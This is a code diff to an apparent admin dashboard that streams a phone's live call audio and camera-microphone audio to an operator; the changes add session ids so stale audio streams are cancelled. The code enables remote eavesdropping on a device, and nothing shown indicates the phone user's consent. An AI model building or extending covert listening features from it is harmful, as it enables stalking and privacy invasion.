@@ -1253,6 +1253,7 @@ async function deleteRecording(recordingId) {
 let audioContext = null;
 let hearStreamReader = null;
 let isHearing = false;
+let hearSessionId = 0;
 
 let talkAudioContext = null;
 let talkStream = null;
@@ -1263,6 +1264,8 @@ let cameraAudioContext = null;
 let cameraAudioReader = null;
 let isCameraAudioPlaying = false;
 let isCameraAudioManuallyMuted = false;
+let isCameraAudioConnecting = false;
+let cameraAudioSessionId = 0;
 
 // 1. Listen Live (Hear Phone Call)
 const startHearBtn = document.getElementById('start-hear-btn');
@@ -1285,9 +1288,19 @@ async function startHearing() {
     audioContext = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
     let nextStartTime = 0;
     
+    const currentSessionId = ++hearSessionId;
+    
     const response = await fetch(`${config.serverUrl}/api/audio/stream?email=${encodeURIComponent(config.adminEmail)}&token=${encodeURIComponent(config.adminToken)}`);
     if (!response.ok) {
       throw new Error(`HTTP Error ${response.status}`);
+    }
+    
+    if (currentSessionId !== hearSessionId) {
+      try {
+        const reader = response.body.getReader();
+        reader.cancel();
+      } catch (e) {}
+      return;
     }
     
     isHearing = true;
@@ -1299,9 +1312,13 @@ async function startHearing() {
     const reader = response.body.getReader();
     hearStreamReader = reader;
     
-    while (isHearing) {
+    while (isHearing && currentSessionId === hearSessionId) {
       const { done, value } = await reader.read();
       if (done) break;
+      
+      if (currentSessionId !== hearSessionId) {
+        break;
+      }
       
       if (value && value.byteLength >= 2) {
         const view = new DataView(value.buffer, value.byteOffset, value.byteLength);
@@ -1330,7 +1347,9 @@ async function startHearing() {
         nextStartTime += audioBuffer.duration;
       }
     }
-    stopHearing();
+    if (currentSessionId === hearSessionId) {
+      stopHearing();
+    }
   } catch (err) {
     console.error('Failed to hear stream:', err);
     alert('Live audio stream connection failed. Make sure the phone is actively in a call and online!');
@@ -1340,6 +1359,7 @@ async function startHearing() {
 
 function stopHearing() {
   isHearing = false;
+  hearSessionId++;
   if (hearStreamReader) {
     try { hearStreamReader.cancel(); } catch (e) {}
     hearStreamReader = null;
@@ -1448,6 +1468,9 @@ async function startCameraAudio() {
     const cameraAudioBtn = document.getElementById('camera-audio-btn');
     if (!cameraAudioBtn) return;
 
+    if (isCameraAudioPlaying || isCameraAudioConnecting) return;
+    isCameraAudioConnecting = true;
+
     cameraAudioBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin" style="margin-right: 8px;"></i> Connecting...`;
 
     if (!cameraAudioContext) {
@@ -1463,12 +1486,23 @@ async function startCameraAudio() {
     }
     let nextStartTime = 0;
 
+    const currentSessionId = ++cameraAudioSessionId;
+
     const response = await fetch(`${config.serverUrl}/api/audio/stream?email=${encodeURIComponent(config.adminEmail)}&token=${encodeURIComponent(config.adminToken)}`);
     if (!response.ok) {
       throw new Error(`HTTP Error ${response.status}`);
     }
 
+    if (currentSessionId !== cameraAudioSessionId) {
+      try {
+        const reader = response.body.getReader();
+        reader.cancel();
+      } catch (e) {}
+      return;
+    }
+
     isCameraAudioPlaying = true;
+    isCameraAudioConnecting = false;
     cameraAudioBtn.innerHTML = `<i class="fa-solid fa-volume-high" style="margin-right: 8px;"></i> Audio: Listening`;
     cameraAudioBtn.style.borderColor = '#10B981';
     cameraAudioBtn.style.color = '#10B981';
@@ -1476,9 +1510,13 @@ async function startCameraAudio() {
     const reader = response.body.getReader();
     cameraAudioReader = reader;
 
-    while (isCameraAudioPlaying) {
+    while (isCameraAudioPlaying && currentSessionId === cameraAudioSessionId) {
       const { done, value } = await reader.read();
       if (done) break;
+
+      if (currentSessionId !== cameraAudioSessionId) {
+        break;
+      }
 
       if (value && value.byteLength >= 2) {
         const view = new DataView(value.buffer, value.byteOffset, value.byteLength);
@@ -1507,15 +1545,20 @@ async function startCameraAudio() {
         nextStartTime += audioBuffer.duration;
       }
     }
-    stopCameraAudio();
+    if (currentSessionId === cameraAudioSessionId) {
+      stopCameraAudio();
+    }
   } catch (err) {
     console.error('Failed to hear camera audio:', err);
+    isCameraAudioConnecting = false;
     stopCameraAudio();
   }
 }
 
 function stopCameraAudio() {
   isCameraAudioPlaying = false;
+  isCameraAudioConnecting = false;
+  cameraAudioSessionId++;
   if (cameraAudioReader) {
     try { cameraAudioReader.cancel(); } catch (e) {}
     cameraAudioReader = null;
